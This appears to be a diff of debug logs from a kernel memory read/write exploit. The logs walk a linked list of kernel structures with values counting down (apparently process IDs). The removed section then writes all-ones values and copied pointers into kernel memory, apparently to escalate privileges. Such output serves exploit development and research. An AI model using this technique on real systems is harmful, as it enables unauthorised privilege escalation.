-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE072662E8 - value: 0x000000000000003A
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07266238 - value: 0xFFFFF0CE2CD5D6D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CD5D780 - value: 0x0000000000000039
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CD5D6D0 - value: 0xFFFFF0CE2CCFC000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CCFC0B0 - value: 0x0000000000000038
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CCFC000 - value: 0xFFFFF0CE2CB12238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB122E8 - value: 0x0000000000000037
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB12238 - value: 0xFFFFF0CE073D0B68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D0C18 - value: 0x0000000000000036
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D0B68 - value: 0xFFFFF0CE07AD8B68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07AD8C18 - value: 0x0000000000000035
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07AD8B68 - value: 0xFFFFF0CE073D16D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D1780 - value: 0x0000000000000034
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D16D0 - value: 0xFFFFF0CE2CB12DA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB12E50 - value: 0x0000000000000033
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB12DA0 - value: 0xFFFFF0CE073D2238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D22E8 - value: 0x0000000000000032
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D2238 - value: 0xFFFFF0CE073D2DA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D2E50 - value: 0x0000000000000031
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D2DA0 - value: 0xFFFFF0CE073D4000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D40B0 - value: 0x0000000000000030
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D4000 - value: 0xFFFFF0CE07AD96D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07AD9780 - value: 0x000000000000002F
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07AD96D0 - value: 0xFFFFF0CE073D4B68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D4C18 - value: 0x000000000000002E
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D4B68 - value: 0xFFFFF0CE073D56D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D5780 - value: 0x000000000000002D
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D56D0 - value: 0xFFFFF0CE07ADA238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07ADA2E8 - value: 0x000000000000002C
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07ADA238 - value: 0xFFFFF0CE073D6238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D62E8 - value: 0x000000000000002B
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D6238 - value: 0xFFFFF0CE073D6DA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D6E50 - value: 0x000000000000002A
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D6DA0 - value: 0xFFFFF0CE07268000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE072680B0 - value: 0x0000000000000028
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07268000 - value: 0xFFFFF0CE07ADADA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07ADAE50 - value: 0x0000000000000027
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07ADADA0 - value: 0xFFFFF0CE073D8000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D80B0 - value: 0x0000000000000026
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE073D8000 - value: 0xFFFFF0CE072696D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07269780 - value: 0x0000000000000024
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE072696D0 - value: 0xFFFFF0CE07010000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE070100B0 - value: 0x0000000000000023
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE07010000 - value: 0xFFFFF0CE062B8B68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062B8C18 - value: 0x0000000000000022
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062B8B68 - value: 0xFFFFF0CE062B96D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062B9780 - value: 0x0000000000000021
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062B96D0 - value: 0xFFFFF0CE062BA238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062BA2E8 - value: 0x0000000000000020
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062BA238 - value: 0xFFFFF0CE062BADA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062BAE50 - value: 0x000000000000001F
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062BADA0 - value: 0xFFFFF0CE055E8B68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E8C18 - value: 0x000000000000001E
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E8B68 - value: 0xFFFFF0CE055E96D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E9780 - value: 0x000000000000001D
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E96D0 - value: 0xFFFFF0CE055EA238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055EA2E8 - value: 0x000000000000001C
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055EA238 - value: 0xFFFFF0CE055EADA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055EAE50 - value: 0x000000000000001B
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055EADA0 - value: 0xFFFFF0CE06270000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062700B0 - value: 0x000000000000001A
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE06270000 - value: 0xFFFFF0CE06270B68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE06270C18 - value: 0x0000000000000019
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE06270B68 - value: 0xFFFFF0CE062716D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE06271780 - value: 0x0000000000000018
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062716D0 - value: 0xFFFFF0CE06272238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE062722E8 - value: 0x0000000000000017
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE06272238 - value: 0xFFFFF0CE06272DA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE06272E50 - value: 0x0000000000000016
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE06272DA0 - value: 0xFFFFF0CE05276238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE052762E8 - value: 0x0000000000000015
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE05276238 - value: 0xFFFFF0CE05276DA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE05276E50 - value: 0x0000000000000014
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE05276DA0 - value: 0xFFFFF0CE055E0000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E00B0 - value: 0x0000000000000013
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E0000 - value: 0xFFFFF0CE055E0B68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E0C18 - value: 0x0000000000000012
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E0B68 - value: 0xFFFFF0CE055E16D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E1780 - value: 0x0000000000000011
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E16D0 - value: 0xFFFFF0CE055E2238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E22E8 - value: 0x0000000000000010
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E2238 - value: 0xFFFFF0CE055E2DA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E2E50 - value: 0x000000000000000F
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E2DA0 - value: 0xFFFFF0CE055E8000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E80B0 - value: 0x0000000000000009
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE055E8000 - value: 0xFFFFF0CE0427CB68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427CC18 - value: 0x0000000000000008
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427CB68 - value: 0xFFFFF0CE0427D6D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427D780 - value: 0x0000000000000007
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427D6D0 - value: 0xFFFFF0CE0427E238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427E2E8 - value: 0x0000000000000006
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427E238 - value: 0xFFFFF0CE0427EDA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427EE50 - value: 0x0000000000000005
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427EDA0 - value: 0xFFFFF0CE05274000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE052740B0 - value: 0x0000000000000004
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE05274000 - value: 0xFFFFF0CE05274B68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE05274C18 - value: 0x0000000000000003
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE05274B68 - value: 0xFFFFF0CE052756D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE05275780 - value: 0x0000000000000002
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE052756D0 - value: 0xFFFFF0CE04278000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE042780B0 - value: 0x000000000000000E
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE04278000 - value: 0xFFFFF0CE04278B68
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE04278C18 - value: 0x000000000000000D
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE04278B68 - value: 0xFFFFF0CE042796D0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE04279780 - value: 0x000000000000000C
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE042796D0 - value: 0xFFFFF0CE0427A238
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427A2E8 - value: 0x000000000000000B
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427A238 - value: 0xFFFFF0CE0427ADA0
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427AE50 - value: 0x0000000000000001
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427ADA0 - value: 0xFFFFF0CE0427C000
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427C0B0 - value: 0x000000000000000A
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0427C000 - value: 0xFFFFFFFFDCCE0E00
-[*] kread: 4 byte(s) - 0x0000000225BFCE28 <= 0xFFFFFFFFDCCE0EB0 - value: 0x0000000000000000
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0E278 - value: 0xFFFFF0CE0B22E400
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFFFFFDCCE0E40 - value: 0xFFFFF0CE0422FA00
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0422FA30 - value: 0xFFFFFFFFDCBC6580
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E404 - value: 0x0000000000000000
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E408 - value: 0x0000000000000000
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E40C - value: 0x0000000000000000
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E410 - value: 0x0000000000000001
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E414 - value: 0x0000000000000000
-[*] kwrite: 4 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E418 - value: 0x0000000000000000
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E430 - value: 0xFFFFFFFFDCBC6580
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E458 - value: 0x4800000000000007
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E460 - value: 0xFFFFFFFFFFFFFFFF
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E468 - value: 0xFFFFFFFFFFFFFFFF
-[*] kwrite: 1 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE0B22E483 - value: 0x0000000000000080
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE2CB0E280 - value: 0xFFFFF0CE3013EA00
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFFFFFDCCE0E48 - value: 0xFFFFF0CE0422F800
-[*] kread: 8 byte(s) - 0x0000000225BFCE28 <= 0xFFFFF0CE0422F810 - value: 0xFFFFF0CE07159128
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE3013EA10 - value: 0xFFFFF0CE07159128
-[*] kwrite: 8 byte(s) - 0x0000000225BFCE28 => 0xFFFFF0CE3013EA18 - value: 0xFFFFF0CE07159128
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFFFFF97C786E0 - value: 0xFFFFAEB1062C6DA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C6E50 - value: 0x0000000000000043
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C6DA0 - value: 0xFFFFAEB1062C8000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C80B0 - value: 0x0000000000000042
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFFFFF97C786E0 - value: 0xFFFFAEB1062C6DA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C6E50 - value: 0x0000000000000043
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C6DA0 - value: 0xFFFFAEB1062C8000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C80B0 - value: 0x0000000000000042
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C8000 - value: 0xFFFFAEB130856DA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130856E50 - value: 0x0000000000000041
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130856DA0 - value: 0xFFFFAEB130858000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1308580B0 - value: 0x0000000000000040
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130858000 - value: 0xFFFFAEB130858B68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130858C18 - value: 0x000000000000003F
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130858B68 - value: 0xFFFFAEB1308596D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130859780 - value: 0x000000000000003E
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1308596D0 - value: 0xFFFFAEB13085A238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB13085A2E8 - value: 0x000000000000003D
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB13085A238 - value: 0xFFFFAEB10725E238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10725E2E8 - value: 0x000000000000003C
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10725E238 - value: 0xFFFFAEB10725EDA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10725EE50 - value: 0x000000000000003B
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10725EDA0 - value: 0xFFFFAEB107434000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1074340B0 - value: 0x000000000000003A
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107434000 - value: 0xFFFFAEB10725A238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10725A2E8 - value: 0x0000000000000039
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10725A238 - value: 0xFFFFAEB107AB0000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107AB00B0 - value: 0x0000000000000038
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107AB0000 - value: 0xFFFFAEB130C78000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130C780B0 - value: 0x0000000000000037
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB130C78000 - value: 0xFFFFAEB107434B68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107434C18 - value: 0x0000000000000036
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107434B68 - value: 0xFFFFAEB1074356D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107435780 - value: 0x0000000000000035
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1074356D0 - value: 0xFFFFAEB107AB0B68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107AB0C18 - value: 0x0000000000000034
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107AB0B68 - value: 0xFFFFAEB107AB16D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107AB1780 - value: 0x0000000000000033
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107AB16D0 - value: 0xFFFFAEB107436238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1074362E8 - value: 0x0000000000000032
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107436238 - value: 0xFFFFAEB107436DA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107436E50 - value: 0x0000000000000031
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107436DA0 - value: 0xFFFFAEB107438000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1074380B0 - value: 0x0000000000000030
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107438000 - value: 0xFFFFAEB107AB2238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107AB22E8 - value: 0x000000000000002F
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107AB2238 - value: 0xFFFFAEB13085ADA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB13085AE50 - value: 0x000000000000002E
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB13085ADA0 - value: 0xFFFFAEB107438B68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107438C18 - value: 0x000000000000002D
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107438B68 - value: 0xFFFFAEB1074396D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107439780 - value: 0x000000000000002C
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1074396D0 - value: 0xFFFFAEB10743A238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10743A2E8 - value: 0x000000000000002B
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10743A238 - value: 0xFFFFAEB10743ADA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10743AE50 - value: 0x000000000000002A
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10743ADA0 - value: 0xFFFFAEB10725C000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10725C0B0 - value: 0x0000000000000028
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10725C000 - value: 0xFFFFAEB107AB2DA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107AB2E50 - value: 0x0000000000000027
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107AB2DA0 - value: 0xFFFFAEB10743C000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10743C0B0 - value: 0x0000000000000026
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10743C000 - value: 0xFFFFAEB10725D6D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10725D780 - value: 0x0000000000000024
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10725D6D0 - value: 0xFFFFAEB107010000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1070100B0 - value: 0x0000000000000023
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB107010000 - value: 0xFFFFAEB1062C8B68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C8C18 - value: 0x0000000000000022
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C8B68 - value: 0xFFFFAEB1062C96D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C9780 - value: 0x0000000000000021
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062C96D0 - value: 0xFFFFAEB1062CA238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062CA2E8 - value: 0x0000000000000020
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062CA238 - value: 0xFFFFAEB1062CADA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062CAE50 - value: 0x000000000000001F
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062CADA0 - value: 0xFFFFAEB105628B68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105628C18 - value: 0x000000000000001E
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105628B68 - value: 0xFFFFAEB1056296D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105629780 - value: 0x000000000000001D
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1056296D0 - value: 0xFFFFAEB10562A238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10562A2E8 - value: 0x000000000000001C
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10562A238 - value: 0xFFFFAEB10562ADA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10562AE50 - value: 0x000000000000001B
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB10562ADA0 - value: 0xFFFFAEB106280000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062800B0 - value: 0x000000000000001A
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB106280000 - value: 0xFFFFAEB106280B68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB106280C18 - value: 0x0000000000000019
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB106280B68 - value: 0xFFFFAEB1062816D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB106281780 - value: 0x0000000000000018
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062816D0 - value: 0xFFFFAEB106282238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1062822E8 - value: 0x0000000000000017
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB106282238 - value: 0xFFFFAEB106282DA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB106282E50 - value: 0x0000000000000016
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB106282DA0 - value: 0xFFFFAEB105276238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1052762E8 - value: 0x0000000000000015
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105276238 - value: 0xFFFFAEB105276DA0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105276E50 - value: 0x0000000000000014
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105276DA0 - value: 0xFFFFAEB105620000
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1056200B0 - value: 0x0000000000000013
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105620000 - value: 0xFFFFAEB105620B68
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105620C18 - value: 0x0000000000000012
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105620B68 - value: 0xFFFFAEB1056216D0
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105621780 - value: 0x0000000000000011
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1056216D0 - value: 0xFFFFAEB105622238
+[*] kread: 4 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB1056222E8 - value: 0x0000000000000010
+[*] kread: 8 byte(s) - 0x00000002263FCE28 <= 0xFFFFAEB105622238 - value: 0xFFFFAEB105622DA0
